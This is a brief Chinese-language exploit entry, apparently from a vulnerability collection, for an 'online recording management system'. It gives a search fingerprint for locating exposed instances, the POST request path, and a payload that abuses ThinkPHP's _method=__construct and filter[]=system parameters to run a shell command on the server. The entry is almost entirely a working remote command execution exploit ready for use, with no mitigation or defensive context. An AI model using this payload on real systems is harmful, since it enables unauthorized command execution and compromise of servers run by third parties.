# 在线录音管理系统indexRCE漏洞

在线录音管理系统index ｜ 命令执行 ｜ —
- **指纹**：`title="在线录音管理系统"`
- **请求**：`POST /callcenter/public/index.php/index.php?s=index/index/index HTTP/1.1`

**Payload**
```
s=echo stctest&_method=__construct&method=POST&filter[]=system
```